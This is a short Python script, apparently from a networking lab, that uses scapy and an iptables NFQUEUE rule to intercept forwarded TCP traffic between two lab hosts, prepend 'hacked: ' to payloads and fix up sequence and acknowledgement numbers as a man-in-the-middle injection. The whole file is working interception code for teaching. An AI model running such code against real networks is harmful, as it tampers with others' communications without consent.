from scapy.all import *
from netfilterqueue import NetfilterQueue as NFQ
import os

ACK = 0x10
FIN = 0x01
SYN = 0x02
PSH = 0x08

cnt_client = 0
cnt_server = 0

def alter_packet(pachet):
    global cnt_server
    global cnt_client
    if not pachet.haslayer(TCP):
        return
    if pachet.haslayer(TCP) and ((pachet[TCP].flags & SYN)):
        return pachet
    if (pachet[TCP].flags & ACK):
        if pachet[IP].src == '198.7.0.2':
            pachet[TCP].seq += cnt_server
            pachet[TCP].ack -= cnt_client
        elif pachet[IP].src == '198.7.0.1':
            print(pachet[TCP].ack, cnt_server, pachet[TCP].ack - cnt_server)
            pachet[TCP].ack -= cnt_server
            pachet[TCP].seq += cnt_client
   
    if pachet.getlayer(Raw) is not None:
        if pachet[IP].src == '198.7.0.2':
            dif = len(pachet[Raw].load)
            pachet[Raw].load = b'hacked: ' + pachet[Raw].load
            cnt_server += len(pachet[Raw].load) - dif
        else:
            dif = len(pachet[Raw].load)
            pachet[Raw].load = b'hacked: ' + pachet[Raw].load
            cnt_client += len(pachet[Raw].load) - dif
    del pachet[TCP].chksum
    del pachet[IP].chksum
    del pachet[IP].len
    return IP(pachet.build())

def proceseaza(pachet):
    octeti = pachet.get_payload()
    scapy_pachet = IP(octeti)
    scapy_pachet = alter_packet(scapy_pachet)
    pachet.set_payload(bytes(scapy_pachet))
    #pachet.accept()
    pachet.drop()
    send(scapy_pachet)

queue = NFQ()
try:
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 7")
    queue.bind(7, proceseaza)
    queue.run()
except KeyboardInterrupt:
    queue.unbind()
